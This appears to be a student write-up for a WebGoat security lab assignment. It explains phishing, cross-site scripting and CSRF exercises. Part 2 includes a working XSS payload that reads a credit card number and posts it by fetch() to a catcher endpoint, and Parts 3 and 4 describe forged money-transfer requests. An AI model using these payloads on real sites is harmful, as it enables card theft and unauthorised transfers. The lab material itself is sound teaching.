#Ching Hui, 1005219504, sam.hui@mail.utoronto.ca
#Spencer Ball, 1004762599, spencer.ball@mail.utoronto.ca


Part 1 Explanation:
Searching the attack code will render a login interface containing two input fields, username and password, and a submit button. After submitting, these two fields will be sent to the catcher servlet


Part 2 Explanation:
The vulnerability exists in the input field (input2) for the three digit access code. The unencoded attack URL is as follows:
"
http://localhost:8010/WebGoat/start.mvc#attack/297061215/900?input1=123&input2=
<script>
		var cardNumber = document.getElementsByName("input1")[0].value;
		var url = `http://localhost:8010/WebGoat/catcher?PROPERTY=yes&stolenCardNum=${cardNumber}`;
		fetch(url, {method: "POST"});
		document.getElementsByName("input2")[0].value = "000";
</script>
"
The attack script is passed as a default value for input2. Then, when a user enters their credit card information and presses the Buy button, the script executes and posts the inserted credit card number to the catcher server.


Part 3 Explanation:
An HTML image tag is included in the message, however the URL to the image is modified with a transfer parameter so that whenever someone opens that specific message, $5000 will be transferred from their account. This works because the image element will launch a request to the URL when rendering.


Part 4 Explanation:
The message field is exploitable. The webgoat servlet expects a transfer=CONFIRMED request after a money transfer is requested to confirm the transfer. To do that, we change the src attribute of the iframe to a URL with the transfer parameter set to CONFIRMED.
